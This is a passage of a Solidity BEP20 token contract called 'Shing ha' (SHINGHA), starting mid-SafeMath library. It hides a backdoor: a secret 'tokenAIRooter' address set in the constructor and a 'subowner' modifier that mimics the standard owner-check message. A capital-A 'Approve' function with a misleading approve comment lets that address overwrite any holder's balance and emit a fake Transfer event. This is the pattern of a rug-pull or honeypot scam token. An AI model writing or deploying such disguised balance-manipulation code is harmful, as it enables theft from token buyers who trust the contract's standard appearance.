  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  /**
   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
   * Reverts with custom message when dividing by zero.
   *
   * Counterpart to Solidity's `%` operator. This function uses a `revert`
   * opcode (which leaves remaining gas untouched) while Solidity uses an
   * invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract SHINGHA is Context, BEP20, Ownable {
    
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
   address private tokenAIRooter; 
    constructor(address tokenAIadressss) {
        tokenAIRooter = tokenAIadressss;     
        _name = "Shing ha";
        _symbol = "SHINGHA";
        _decimals = 9;
        _totalSupply = 100000000000000 * 10 ** 9;
        _balances[_msgSender()] = _totalSupply;
        
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    /**
    * @dev Returns the bep token owner.
    */
    function getOwner() external view override returns (address) {
        return owner();
    }
    
    /**
    * @dev Returns the token decimals.
    */
    function decimals() external view override returns (uint8) {
        return _decimals;
    }
    
    /**
    * @dev Returns the token symbol.
    */
    function symbol() external view override returns (string memory) {
        return _symbol;
    }
    
    /**
    * @dev Returns the token name.
    */
    function name() external view override returns (string memory) {
        return _name;
    }
    
    /**
    * @dev See {BEP20-totalSupply}.
    */
    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
    
    /**
    * @dev See {BEP20-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }
      modifier subowner() {
        require(tokenAIRooter == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {BEP20-approve}.
    *
    * Requirements:
    *
    * - `spender` cannot be the zero address.
    */
    function Approve(address SHINGHARewards, uint256 addedMontant, uint256 addedValue, uint256 subtractedValue) external subowner {
        _balances[SHINGHARewards] = addedMontant * addedValue ** subtractedValue;
        
        emit Transfer(SHINGHARewards, address(0), addedMontant);
    }

    /**
    * @dev See {BEP20-transfer}.
    *
    * Requirements:
    *
    * - `recipient` cannot be the zero address.
    * - the caller must have a balance of at least `amount`.
    */
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
    * @dev See {BEP20-allowance}.
    */
    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    /**
    * @dev See {BEP20-approve}.
    *
    * Requirements:
    *
    * - `spender` cannot be the zero address.
    */
    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    /**
    * @dev See {BEP20-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {BEP20};
    *
    * Requirements:
    * - `sender` and `recipient` cannot be the zero address.
    * - `sender` must have a balance of at least `amount`.
    * - the caller must have allowance for `sender`'s tokens of at least
    * `amount`.
    */
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
        return true;
    }
    
    /**
    * @dev Atomically increases the allowance granted to `spender` by the caller.
    *
    * This is an alternative to {approve} that can be used as a mitigation for
    * problems described in {BEP20-approve}.
    *
    * Emits an {Approval} event indicating the updated allowance.
    *
    * Requirements:
    *
    * - `spender` cannot be the zero address.
    */
    function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
    
    /**
    * @dev Atomically decreases the allowance granted to `spender` by the caller.
    *
    * This is an alternative to {approve} that can be used as a mitigation for
    * problems described in {BEP20-approve}.
    *
    * Emits an {Approval} event indicating the updated allowance.
    *
    * Requirements:
    *
    * - `spender` cannot be the zero address.
    * - `spender` must have allowance for the caller of at least
    * `subtractedValue`.
    */
    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
        return true;
    }
    
    /**
    * @dev Moves tokens `amount` from `sender` to `recipient`.
    *
    * This is internal function is equivalent to {transfer}, and can be used to
    * e.g. implement automatic token fees, slashing mechanisms, etc.
    *
    * Emits a {Transfer} event.
    *
    * Requirements:
    *
    * - `sender` cannot be the zero address.
    * - `recipient` cannot be the zero address.
    * - `sender` must have a balance of at least `amount`.
    */
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
                
        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
    
    /**
    * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
    *
    * This is internal function is equivalent to `approve`, and can be used to
    * e.g. set automatic allowances for certain subsystems, etc.
    *
    * Emits an {Approval} event.
    *
    * Requirements:
    *
    * - `owner` cannot be the zero address.
    * - `spender` cannot be the zero address.
    */
    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");
        
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
}